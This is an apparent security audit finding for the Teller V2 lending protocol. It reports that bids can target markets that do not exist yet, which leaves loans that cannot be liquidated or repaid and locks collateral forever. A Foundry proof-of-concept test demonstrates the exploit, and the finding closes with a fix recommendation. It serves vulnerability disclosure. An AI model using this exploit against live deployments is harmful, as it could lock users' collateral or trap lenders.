immeas

medium

# bids can be created against markets that doesn't exist

## Summary
Bids can be created against markets that does not yet exist. When this market is created, the bid can be accepted but neither defaulted/liquidated nor repaid.

## Vulnerability Detail
There's no verification that the market actually exists when submitting a bid. Hence a user could submit a bid for a non existing market.

For it to not revert it must have 0% APY and the bid cannot be accepted until a market exists.

However, when this market is created the bid can be accepted. Then the loan would be impossible to default/liquidate:

https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/TellerV2.sol#L963
```solidity
File: TellerV2.sol

963:        if (bidDefaultDuration[_bidId] == 0) return false;
```
Since `bidDefaultDuration[_bidId]` will be `0`

Any attempt to repay will revert due to division by 0:

https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/libraries/V2Calculations.sol#L116-L117
```solidity
File: libraries/V2Calculations.sol

116:            uint256 owedAmount = (maxCycleOwed * owedTime) /
117:                _bid.terms.paymentCycle; 
``` 
Since `_bid.terms.paymentCycle` will also be `0` (and it will always end up in this branch since `PaymentType` will be `EMI (0)`).

Hence the loan can never be closed.

PoC:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { UpgradeableBeacon } from "@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol";

import { TellerV2 } from "../contracts/TellerV2.sol";
import { CollateralManager } from "../contracts/CollateralManager.sol";
import { LenderCommitmentForwarder } from "../contracts/LenderCommitmentForwarder.sol";
import { CollateralEscrowV1 } from "../contracts/escrow/CollateralEscrowV1.sol";
import { MarketRegistry } from "../contracts/MarketRegistry.sol";

import { ReputationManagerMock } from "../contracts/mock/ReputationManagerMock.sol";
import { LenderManagerMock } from "../contracts/mock/LenderManagerMock.sol";
import { TellerASMock } from "../contracts/mock/TellerASMock.sol";

import {TestERC20Token} from "./tokens/TestERC20Token.sol";

import "lib/forge-std/src/Test.sol";
import "lib/forge-std/src/StdAssertions.sol";

contract LoansTest is Test {
    MarketRegistry marketRegistry;
    TellerV2 tellerV2;
    
    TestERC20Token principalToken;

    address alice = address(0x1111);
    address bob = address(0x2222);
    address owner = address(0x3333);

    function setUp() public {
        tellerV2 = new TellerV2(address(0));

        marketRegistry = new MarketRegistry();
        TellerASMock tellerAs = new TellerASMock();
        marketRegistry.initialize(tellerAs);

        LenderCommitmentForwarder lenderCommitmentForwarder = 
            new LenderCommitmentForwarder(address(tellerV2),address(marketRegistry));
        CollateralManager collateralManager = new CollateralManager();
        collateralManager.initialize(address(new UpgradeableBeacon(address(new CollateralEscrowV1()))),
            address(tellerV2));
        address rm = address(new ReputationManagerMock());
        address lm = address(new LenderManagerMock());
        tellerV2.initialize(0, address(marketRegistry), rm, address(lenderCommitmentForwarder),
            address(collateralManager), lm);

        principalToken = new TestERC20Token("Principal Token", "PRIN", 12e18, 18);
    }

    function testSubmitBidForNonExistingMarket() public {
        uint256 amount = 12e18;
        principalToken.transfer(bob,amount);

        vm.prank(bob);
        principalToken.approve(address(tellerV2),amount);

        // alice places bid on non-existing market
        vm.prank(alice);
        uint256 bidId = tellerV2.submitBid(
            address(principalToken),
            1, // non-existing right now
            amount,
            360 days,
            0, // any APY != 0 will cause revert on div by 0
            "",
            alice
        );

        // bid cannot be accepted before market
        vm.expectRevert(); // div by 0
        vm.prank(bob);
        tellerV2.lenderAcceptBid(bidId);

        vm.startPrank(owner);
        uint256 marketId = marketRegistry.createMarket(
            owner,
            30 days,
            30 days,
            1 days,
            0,
            false,
            false,
            ""
        );
        marketRegistry.setMarketFeeRecipient(marketId, owner);
        vm.stopPrank();

        // lender takes bid
        vm.prank(bob);
        tellerV2.lenderAcceptBid(bidId);

        // should be liquidatable now
        vm.warp(32 days);

        // loan cannot be defaulted/liquidated
        assertFalse(tellerV2.isLoanDefaulted(bidId));
        assertFalse(tellerV2.isLoanLiquidateable(bidId));

        vm.startPrank(alice);
        principalToken.approve(address(tellerV2),12e18);

        // and loan cannot be repaid
        vm.expectRevert(); // division by 0
        tellerV2.repayLoanFull(bidId);
        vm.stopPrank();
    }
}
```

## Impact
This will lock any collateral forever since there's no way to retrieve it. For this to happen accidentally a borrower would have to create a bid for a non existing market with 0% APY though.

This could also be used to lure lenders since the loan cannot be liquidated/defaulted. This might be difficult since the APY must be 0% for the bid to be created. Also, this will lock any collateral provided by the borrower forever.

Due to these circumstances I'm categorizing this as medium.

## Code Snippet
https://github.com/sherlock-audit/2023-03-teller/blob/main/teller-protocol-v2/packages/contracts/contracts/TellerV2.sol#L334-L411

## Tool used
Manual Review

## Recommendation
When submitting a bid, verify that the market exists.